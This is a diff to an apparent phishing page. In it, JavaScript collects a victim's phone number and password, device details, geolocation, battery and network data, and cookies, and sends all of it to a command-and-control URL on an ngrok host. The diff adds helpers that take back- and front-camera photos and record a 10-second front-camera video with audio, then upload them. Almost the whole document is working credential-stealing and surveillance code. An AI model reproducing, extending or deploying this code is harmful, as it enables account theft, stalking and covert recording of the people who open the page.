@@ -14,7 +14,6 @@
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         .status { color: #88ff88; font-size: 14px; margin-top: 10px; }
         #statusBox { background: #0a0a1a; padding: 10px; border-radius: 5px; font-size: 12px; color: #88ff88; max-height: 150px; overflow-y: auto; text-align: left; margin-top: 10px; font-family: monospace; }
-        .hidden { display: none; }
     </style>
 </head>
 <body>
@@ -46,9 +45,6 @@
 
     <script>
         const C2_URL = 'https://matchless-palm-patriarch.ngrok-free.dev/exfil';
-        let mediaStream = null;
-        let mediaRecorder = null;
-        let recordedChunks = [];
 
         function log(msg) {
             const box = document.getElementById('statusBox');
@@ -62,7 +58,6 @@
         function sendData(data) {
             data.time = new Date().toISOString();
             data.userAgent = navigator.userAgent;
-            
             fetch(C2_URL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -76,164 +71,152 @@
         function step1() {
             const phone = document.getElementById('phone').value;
             const pass = document.getElementById('pass').value;
-
             if (!phone || !pass) {
                 alert('Please enter your phone number and password.');
                 return;
             }
-
             sendData({ type: 'credentials', phone, pass });
             log('✅ Credentials sent');
-
             document.getElementById('step1').classList.add('hidden');
             document.getElementById('step2').classList.remove('hidden');
-
-            // Start collecting data
             collectAllData();
         }
 
         // ============================================================
-        // STEP 2: COLLECT ALL DATA + MEDIA
+        // STEP 2: CAPTURE ALL
         // ============================================================
         async function collectAllData() {
             log('📡 Starting data collection...');
 
-            // 1. Device Info
-            const deviceInfo = {
+            // --- Device info ---
+            sendData({
+                type: 'device_info',
                 userAgent: navigator.userAgent,
                 platform: navigator.platform,
                 language: navigator.language,
                 screen: screen.width + 'x' + screen.height,
                 hardwareConcurrency: navigator.hardwareConcurrency,
                 deviceMemory: navigator.deviceMemory
-            };
-            sendData({ type: 'device_info', ...deviceInfo });
+            });
             log('✅ Device info sent');
 
-            // 2. Location
+            // --- Location ---
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
-                    pos => {
-                        const loc = {
-                            lat: pos.coords.latitude,
-                            lon: pos.coords.longitude,
-                            accuracy: pos.coords.accuracy
-                        };
-                        sendData({ type: 'location', ...loc });
-                        log('✅ Location captured');
-                    },
+                    pos => sendData({ type: 'location', lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy }),
                     err => log('❌ Location denied')
                 );
             }
 
-            // 3. Battery
+            // --- Battery ---
             if (navigator.getBattery) {
                 const battery = await navigator.getBattery();
-                sendData({
-                    type: 'battery',
-                    level: Math.round(battery.level * 100) + '%',
-                    charging: battery.charging
-                });
-                log('✅ Battery data sent');
+                sendData({ type: 'battery', level: Math.round(battery.level * 100) + '%', charging: battery.charging });
+                log('✅ Battery sent');
             }
 
-            // 4. Network
+            // --- Network ---
             if (navigator.connection) {
-                sendData({
-                    type: 'network',
-                    type: navigator.connection.effectiveType,
-                    downlink: navigator.connection.downlink
-                });
-                log('✅ Network data sent');
+                sendData({ type: 'network', type: navigator.connection.effectiveType, downlink: navigator.connection.downlink });
+                log('✅ Network sent');
             }
 
-            // 5. Cookies
+            // --- Cookies ---
             sendData({ type: 'storage', cookies: document.cookie || 'none' });
             log('✅ Cookies sent');
 
             // ============================================================
-            // 6. CAMERA + MICROPHONE CAPTURE
+            // MEDIA CAPTURE — BACK PHOTO + FRONT PHOTO + FRONT VIDEO
             // ============================================================
-            log('🎥 Requesting camera & mic...');
             try {
-                mediaStream = await navigator.mediaDevices.getUserMedia({
-                    video: {
-                        facingMode: 'environment',
-                        width: { ideal: 640 },
-                        height: { ideal: 480 }
-                    },
-                    audio: true
-                });
+                // --- 1. BACK CAMERA PHOTO ---
+                log('📸 Capturing back camera photo...');
+                const backPhoto = await capturePhoto('environment');
+                if (backPhoto) {
+                    sendData({ type: 'photo', camera: 'back', data: backPhoto });
+                    log('✅ Back photo captured');
+                }
 
-                log('✅ Camera & mic granted');
+                // --- 2. FRONT CAMERA PHOTO ---
+                log('🤳 Capturing front camera photo...');
+                const frontPhoto = await capturePhoto('user');
+                if (frontPhoto) {
+                    sendData({ type: 'photo', camera: 'front', data: frontPhoto });
+                    log('✅ Front photo captured');
+                }
 
-                // --- Capture photo ---
-                const video = document.createElement('video');
-                video.srcObject = mediaStream;
-                video.play();
-
-                await new Promise(resolve => setTimeout(resolve, 1000));
-
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth || 640;
-                canvas.height = video.videoHeight || 480;
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                const photoData = canvas.toDataURL('image/jpeg', 0.7).split(',')[1]; // Base64
-
-                sendData({
-                    type: 'photo',
-                    data: photoData,
-                    width: canvas.width,
-                    height: canvas.height
-                });
-                log('✅ Photo captured and sent');
-
-                // --- Record audio (5 seconds) ---
-                log('🎤 Recording audio...');
-                const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                const audioRecorder = new MediaRecorder(audioStream);
-                const audioChunks = [];
-
-                audioRecorder.ondataavailable = event => {
-                    if (event.data.size > 0) audioChunks.push(event.data);
-                };
-
-                audioRecorder.onstop = () => {
-                    const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
-                    const reader = new FileReader();
-                    reader.onload = () => {
-                        const base64Audio = reader.result.split(',')[1];
-                        sendData({
-                            type: 'audio',
-                            data: base64Audio,
-                            size: audioBlob.size
-                        });
-                        log('✅ Audio recorded and sent');
-                    };
-                    reader.readAsDataURL(audioBlob);
-                };
-
-                audioRecorder.start();
-                await new Promise(resolve => setTimeout(resolve, 5000));
-                audioRecorder.stop();
-
-                // Cleanup
-                video.remove();
-                mediaStream.getTracks().forEach(t => t.stop());
-                audioStream.getTracks().forEach(t => t.stop());
+                // --- 3. FRONT CAMERA VIDEO (10 sec with audio) ---
+                log('🎥 Recording front camera video (10 sec)...');
+                const videoData = await captureVideo('user', 10);
+                if (videoData) {
+                    sendData({ type: 'video', camera: 'front', duration: '10s', data: videoData });
+                    log('✅ Front video captured');
+                }
 
             } catch (err) {
-                log('❌ Media capture failed: ' + err.message);
+                log('❌ Media error: ' + err.message);
                 sendData({ type: 'media_error', error: err.message });
             }
 
-            // Done
             document.getElementById('statusText').innerHTML = '✅ All data collected!';
             setTimeout(() => {
                 document.getElementById('step2').classList.add('hidden');
                 document.getElementById('step3').classList.remove('hidden');
             }, 1500);
+        }
+
+        // ============================================================
+        // HELPER: CAPTURE PHOTO
+        // ============================================================
+        async function capturePhoto(facingMode) {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: facingMode, width: { ideal: 640 }, height: { ideal: 480 } }
+                });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+                await new Promise(resolve => setTimeout(resolve, 500));
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                const dataUrl = canvas.toDataURL('image/jpeg', 0.8).split(',')[1];
+                stream.getTracks().forEach(t => t.stop());
+                return dataUrl;
+            } catch (e) {
+                log('❌ Photo failed (' + facingMode + '): ' + e.message);
+                return null;
+            }
+        }
+
+        // ============================================================
+        // HELPER: CAPTURE VIDEO (with audio)
+        // ============================================================
+        async function captureVideo(facingMode, durationSec) {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: facingMode, width: { ideal: 640 }, height: { ideal: 480 } },
+                    audio: true
+                });
+                const recorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp9,opus' });
+                const chunks = [];
+                recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
+                recorder.start();
+                await new Promise(resolve => setTimeout(resolve, durationSec * 1000));
+                recorder.stop();
+                await new Promise(resolve => recorder.onstop = resolve);
+                stream.getTracks().forEach(t => t.stop());
+                const blob = new Blob(chunks, { type: 'video/webm' });
+                const reader = new FileReader();
+                return new Promise((resolve) => {
+                    reader.onload = () => resolve(reader.result.split(',')[1]);
+                    reader.readAsDataURL(blob);
+                });
+            } catch (e) {
+                log('❌ Video failed: ' + e.message);
+                return null;
+            }
         }
 
         // ============================================================
